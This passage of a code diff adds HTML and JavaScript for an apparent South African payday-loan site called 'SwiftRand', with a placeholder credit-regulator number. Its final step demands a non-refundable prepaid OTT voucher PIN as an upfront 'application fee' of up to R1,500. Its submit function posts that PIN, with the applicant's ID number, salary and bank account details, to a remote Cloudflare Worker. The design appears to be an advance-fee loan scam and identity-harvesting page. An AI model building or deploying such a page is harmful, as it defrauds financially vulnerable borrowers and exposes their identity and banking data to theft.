+        Enter your <strong>12-digit OTT voucher PIN</strong> to pay the application fee of <strong id="s3-fee">—</strong>. Your voucher is consumed when you click Submit. The loan will be disbursed to your bank account within 60 minutes of approval.
+      </p>
+
+      <div class="ott-wrap">
+        <div class="ott-title">🎟️ 12-Digit OTT Voucher PIN</div>
+        <div class="ott-sub">
+          Enter your 12-digit OTT PIN in the three groups of 4 digits as printed on your voucher. Available at most retailers, spaza shops, and supermarkets.<br/>
+          Your voucher must cover the application fee of <strong id="s3-fee-min">R100</strong>.
+        </div>
+        <div class="ott-field">
+          <label>OTT Voucher PIN</label>
+          <input type="text" class="ott-input" id="f-ott"
+            maxlength="14" inputmode="numeric" placeholder="0000 0000 0000"
+            oninput="fmtOTT(this)" autocomplete="off"/>
+          <span class="ferr" id="ott-err" style="display:none;font-size:.75rem;color:var(--red);margin-top:4px"></span>
+        </div>
+        <div class="ott-fee-note">
+          💡 The voucher is fully consumed on submission. Any face value above the required fee is not refunded — use a voucher as close to the exact fee as possible.
+        </div>
+      </div>
+    </div>
+
+    <div class="fcard" style="background:var(--surface);box-shadow:none;border:1px solid var(--border)">
+      <h3 style="border-bottom:none;margin-bottom:0;padding-bottom:0;font-size:.92rem;color:var(--ink2);font-weight:500;font-family:'Inter',sans-serif">
+        By clicking <strong style="color:var(--ink)">Submit Application</strong> you confirm all information provided is accurate, consent to a credit and affordability check per the National Credit Act, and authorise SwiftRand to consume your OTT voucher as payment for the application fee.
+      </h3>
+    </div>
+
+    <div class="snav">
+      <button class="bbk" onclick="goStep(2)">← Back</button>
+      <button class="bnx" id="submit-btn" onclick="submitApp()">Submit Application ✓</button>
+    </div>
+  </div>
+
+  <!-- SUCCESS -->
+  <div id="step-success" style="display:none">
+    <div class="sbox">
+      <div class="ico">🎉</div>
+      <h2>Application Received!</h2>
+      <div class="timer">⚡ Your money arrives within 60 minutes of approval</div>
+      <p>Your OTT voucher has been consumed. Our team is processing your application now — you'll hear from us via SMS and email shortly.</p>
+      <div class="ref" id="ref-num">Ref: SR-0000000</div>
+      <br/><br/>
+      <button class="abtn" style="max-width:220px;margin:0 auto;display:block" onclick="showPage('home')">Back to Home</button>
+    </div>
+  </div>
+
+</div>
+<footer>
+  <p><strong>SwiftRand (Pty) Ltd</strong> — NCR Reg. NCRCP XXXX &nbsp;·&nbsp; <a href="#">Privacy</a> &nbsp;·&nbsp; <a onclick="showPage('faq')">FAQ</a></p>
+  <p style="margin-top:8px;font-size:.67rem">⚠️ Borrow responsibly. National Debt Helpline: 0861 663 226</p>
+</footer>
+</div>
+
+<!-- ═══════════════════ FAQ PAGE ═══════════════════ -->
+<div id="page-faq" class="page">
+  <div class="section" style="max-width:760px">
+    <div class="eyebrow">Help Centre</div>
+    <div class="sec-title" style="margin-bottom:26px">Frequently Asked Questions</div>
+    <div id="faq-list"></div>
+    <div style="text-align:center;margin-top:40px">
+      <button class="abtn" style="max-width:250px;margin:0 auto" onclick="showPage('apply');initApply()">Ready? Apply Now →</button>
+    </div>
+  </div>
+  <footer>
+    <p><strong>SwiftRand (Pty) Ltd</strong> — NCR Reg. NCRCP XXXX &nbsp;·&nbsp; <a href="#">Privacy</a> &nbsp;·&nbsp; <a href="#">Terms</a></p>
+  </footer>
+</div>
+
+<div id="toast"></div>
+
+<script>
+// ══════════════════════════════════════════════════
+// CONFIG — your deployed Cloudflare Worker URL
+// ══════════════════════════════════════════════════
+const WORKER_URL = "https://swiftrand-worker.YOUR-SUBDOMAIN.workers.dev";
+
+// ── Page router ───────────────────────────────────
+function showPage(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById('page-' + id).classList.add('active');
+  window.scrollTo(0, 0);
+}
+function smoothTo(id) {
+  setTimeout(() => document.getElementById(id)?.scrollIntoView({ behavior:'smooth' }), 80);
+}
+
+// ── Fee logic (mirrors worker.js exactly) ────────
+// Application fee: linear R100 (R600 loan) → R1500 (R8500 loan), whole numbers
+function calcAppFee(a) {
+  const ratio = (Number(a) - 600) / (8500 - 600);
+  return Math.round(100 + ratio * (1500 - 100));
+}
+// Initiation fee: NCR, whole numbers
+function calcInitFee(a) { return Math.max(Math.min(Math.round(a * 0.10 + 165), 1207), 100); }
+function calcLoan(a, t) {
+  const init = calcInitFee(a), svc = 69, r = 0.03;
+  const m = Math.round((a + init) * r * Math.pow(1+r,t) / (Math.pow(1+r,t)-1) + svc);
+  return { monthly: m, total: m*t, initFee: init, appFee: calcAppFee(a) };
+}
+const fmt  = n => Math.round(Number(n)).toLocaleString('en-ZA');
+const fmtR = n => 'R ' + fmt(n);
+
+// ── Home calculator ───────────────────────────────
+function updateCalc() {
+  const a = +document.getElementById('amtS').value;
+  const t = +document.getElementById('termS').value;
+  document.getElementById('amtD').textContent  = Math.round(a).toLocaleString('en-ZA');
+  document.getElementById('termD').textContent = t;
+  const c = calcLoan(a, t);
+  document.getElementById('cAppFee').textContent  = fmtR(c.appFee);
+  document.getElementById('cInitFee').textContent = fmtR(c.initFee);
+  document.getElementById('cMonthly').textContent = fmtR(c.monthly);
+  document.getElementById('cTotal').textContent   = fmtR(c.total);
+  ['amtS','termS'].forEach(id => {
+    const sl = document.getElementById(id);
+    const p  = ((sl.value - sl.min) / (sl.max - sl.min)) * 100;
+    sl.style.background = `linear-gradient(90deg,#E8A020 ${p}%,#DDE2F0 ${p}%)`;
+  });
+}
+
+// ── Step management ───────────────────────────────
+let step = 1;
+
+function initApply() {
+  const a = document.getElementById('amtS').value;
+  const t = document.getElementById('termS').value;
+  document.getElementById('f-amount').value = a;
+  document.getElementById('f-term').value   = t;
+  document.getElementById('hint-amt').textContent = fmtR(+a);
+  resetOTTFields();
+  updateEstStrip();
+  goStep(1, true);
+}
+
+function goStep(n, force) {
+  if (!force && n > step && !validate(step)) return;
+  step = n;
+  [1,2,3].forEach(i => {
+    const el = document.getElementById('step' + i);
+    if (el) el.style.display = i === n ? '' : 'none';
+  });
+  document.getElementById('step-success').style.display = 'none';
+  updateProg(n);
+  if (n === 3) prepStep3();
+}
+
+function updateProg(n) {
+  [1,2,3].forEach(i => {
+    const pb = document.getElementById('pb' + i);
+    if (pb) pb.className = 'ps' + (i < n ? ' done' : i === n ? ' active' : '');
+  });
+}
+
+// ── Validation ────────────────────────────────────
+function clr(id) { document.getElementById(id)?.classList.remove('err'); }
+function err(id) { document.getElementById(id)?.classList.add('err'); return false; }
+
+function validate(n) {
+  let ok = true;
+  const req = (id, test) => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    const v = el.value.trim();
+    test(v) ? clr(id) : (err(id), ok = false);
+  };
+
+  if (n === 1) {
+    req('f-name',   v => v.length > 1);
+    req('f-id',     v => /^\d{13}$/.test(v));
+    req('f-email',  v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v));
+    req('f-phone',  v => /^(\+27|0)[6-8]\d{8}$/.test(v.replace(/\s/g,'')));
+    req('f-salary', v => parseFloat(v) > 0);
+    req('f-amount', v => { const n = parseFloat(v); return n >= 600 && n <= 8500; });
+    req('f-term',   v => !!v);
+    req('f-repdate',v => !!v);
+  }
+  if (n === 2) {
+    req('f-bank',     v => !!v);
+    req('f-acctype',  v => !!v);
+    req('f-accholder',v => v.length > 1);
+    req('f-accnum',   v => v.replace(/\D/g,'').length >= 6);
+    req('f-branch',   v => v.replace(/\D/g,'').length >= 5);
+  }
+  if (n === 3) {
+    const ott   = getOTT();
+    const errEl = document.getElementById('ott-err');
+    if (ott.length !== 12) {
+      errEl.textContent = 'Please enter all 12 digits of your OTT voucher (3 groups of 4).';
+      errEl.style.display = '';
+      ok = false;
+    } else {
+      errEl.style.display = 'none';
+    }
+  }
+  return ok;
+}
+
+// ── Live estimate on step 1 ───────────────────────
+function onAmtChange() {
+  const a = parseFloat(document.getElementById('f-amount').value);
+  const t = parseInt(document.getElementById('f-term').value);
+  const h = document.getElementById('hint-amt');
+  if (h && a) h.textContent = fmtR(a);
+  updateEstStrip();
+}
+
+function updateEstStrip() {
+  const a = parseFloat(document.getElementById('f-amount').value);
+  const t = parseInt(document.getElementById('f-term').value);
+  if (!a || !t) { document.getElementById('est-strip').style.display='none'; return; }
+  const c = calcLoan(a, t);
+  document.getElementById('e-app').textContent     = fmtR(c.appFee);
+  document.getElementById('e-monthly').textContent = fmtR(c.monthly);
+  document.getElementById('e-total').textContent   = fmtR(c.total);
+  document.getElementById('est-strip').style.display = '';
+}
+
+// ── Step 3 prep ───────────────────────────────────
+function prepStep3() {
+  const a   = parseFloat(document.getElementById('f-amount').value) || 0;
+  const fee = fmtR(calcAppFee(a));
+  document.getElementById('s3-fee').textContent     = fee;
+  document.getElementById('s3-fee-min').textContent = fee;
+}
+
+// ── OTT single field — auto-groups digits as 4-4-4 ───
+function fmtOTT(el) {
+  const digits = el.value.replace(/\D/g, '').slice(0, 12);
+  // insert spaces after every 4th digit
+  el.value = digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+  document.getElementById('ott-err').style.display = 'none';
+}
+function getOTT() {
+  return (document.getElementById('f-ott').value || '').replace(/\D/g, '');
+}
+function resetOTTFields() {
+  const el = document.getElementById('f-ott');
+  if (el) el.value = '';
+  document.getElementById('ott-err').style.display = 'none';
+}
+
+// ── Submit ────────────────────────────────────────
+async function submitApp() {
+  if (!validate(3)) return;
+
+  const btn = document.getElementById('submit-btn');
+  btn.disabled    = true;
+  btn.textContent = '⏳ Submitting…';
+
+  const a = parseFloat(document.getElementById('f-amount').value);
+  const t = parseInt(document.getElementById('f-term').value);
+  const c = calcLoan(a, t);
+
+  const payload = {
+    fullName:         document.getElementById('f-name').value.trim(),
+    idNumber:         document.getElementById('f-id').value.trim(),
+    email:            document.getElementById('f-email').value.trim(),
+    phone:            document.getElementById('f-phone').value.trim(),
+    salary:           document.getElementById('f-salary').value,
+    loanAmount:       a,
+    term:             t,
+    repaymentDate:    document.getElementById('f-repdate').value,
+    bankName:         document.getElementById('f-bank').value,
+    accountType:      document.getElementById('f-acctype').value,
+    accountHolder:    document.getElementById('f-accholder').value.trim(),
+    accountNumber:    document.getElementById('f-accnum').value.trim(),
+    branchCode:       document.getElementById('f-branch').value.trim(),
+    ottCode:          getOTT(),
+    applicationFee:   String(c.appFee),
+    initiationFee:    String(c.initFee),
+    monthlyRepayment: String(c.monthly),
+    totalRepayable:   String(c.total),
+  };
+
+  try {
+    const res  = await fetch(`${WORKER_URL}/apply`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+    const data = await res.json();
+
+    if (data.ok) {
+      [1,2,3].forEach(i => { const el = document.getElementById('step'+i); if(el) el.style.display='none'; });
+      document.getElementById('step-success').style.display = '';
+      document.getElementById('ref-num').textContent = 'Ref: ' + (data.ref || 'SR-' + Date.now().toString().slice(-7));
+      updateProg(4);
+    } else {
+      showToast('❌ ' + (data.error || 'Submission failed. Please try again.'), true);
+      btn.disabled    = false;
+      btn.textContent = 'Submit Application ✓';
+    }
+  } catch(e) {
+    showToast('❌ Network error. Please check your connection and try again.', true);
+    btn.disabled    = false;
+    btn.textContent = 'Submit Application ✓';
+  }
+}
+
+// ── FAQ ───────────────────────────────────────────
+const faqs = [
+  { q:'How much can I borrow?',          a:'Between R600 and R8,500, repayable over 1 to 6 months.' },
+  { q:'How quickly will I get the money?',a:'We target under 60 minutes from approval to disbursement, during business hours Mon–Fri 8 AM–5 PM. The money goes directly to your nominated SA bank account.' },
+  { q:'What is an OTT voucher?',          a:'An OTT (Over-The-Top) voucher is a prepaid 12-digit PIN voucher available at most SA retailers, spaza shops, and supermarkets — similar to an airtime voucher. You enter the PIN to pay your application fee. No bank card or EFT needed.' },
+  { q:'Where do I get an OTT voucher?',   a:'Ask for an OTT voucher at your nearest retailer, spaza shop, Shoprite, Pick n Pay, or any store that sells prepaid vouchers. Request a value of at least R100.' },
+  { q:'What is the application fee?',     a:'The fee scales linearly from R100 (for a R600 loan) up to R1,500 (for a R8,500 loan) — always a whole number shown upfront. It is paid via your 12-digit OTT voucher.' },
+  { q:'Which bank accounts are supported?', a:'All major SA banks are supported: Absa, African Bank, Capitec, Discovery Bank, FNB, Nedbank, Standard Bank, TymeBank, and others.' },
+  { q:'What is the initiation fee?',      a:'A once-off NCR-regulated fee: 10% of your loan + R165, minimum R100, capped at R1,207. Deducted on disbursement — shown clearly before you sign.' },
+  { q:'What is the interest rate?',       a:'3.0% per month on the outstanding balance, plus a R69/month service fee. All costs are shown in the calculator upfront.' },
+  { q:'What documents do I need?',        a:'Valid SA ID, SA bank account details, proof of monthly income, and a 12-digit OTT voucher for the application fee.' },
+  { q:'Can I repay early?',               a:'Yes — settle at any time with no early settlement penalty. You only pay interest for the days you held the loan.' },
+  { q:'What if I miss a repayment?',      a:'Contact us immediately. Missed payments affect your credit record. National Debt Helpline: 0861 663 226.' },
+];
+
+function buildFAQ() {
+  document.getElementById('faq-list').innerHTML = faqs.map((f,i) => `
+    <div style="background:var(--white);border:1px solid var(--border);border-radius:var(--r);margin-bottom:10px;overflow:hidden">
+      <button onclick="toggleFAQ(${i})" style="width:100%;text-align:left;padding:16px 18px;background:none;border:none;
+        font-family:'Sora',sans-serif;font-size:.91rem;font-weight:600;cursor:pointer;
+        display:flex;justify-content:space-between;align-items:center;color:var(--ink);gap:10px">
+        <span>${f.q}</span><span id="fi${i}" style="color:var(--gold);font-size:1.05rem;flex-shrink:0">+</span>
+      </button>
+      <div id="fb${i}" style="display:none;padding:0 18px 16px;font-size:.86rem;color:var(--ink2);line-height:1.63">${f.a}</div>
+    </div>`).join('');
+}
+function toggleFAQ(i) {
+  const b=document.getElementById('fb'+i), ic=document.getElementById('fi'+i);
+  const open = b.style.display === '';
+  b.style.display = open ? 'none' : '';
+  ic.textContent  = open ? '+' : '−';
+}
+
+// ── Toast ─────────────────────────────────────────
+function showToast(msg, isErr) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className   = 'show' + (isErr ? ' err' : '');
+  setTimeout(() => t.className = '', 3800);
+}
+
+// ── Init ──────────────────────────────────────────
+updateCalc();
+buildFAQ();
+</script>
+</body>
+</html>
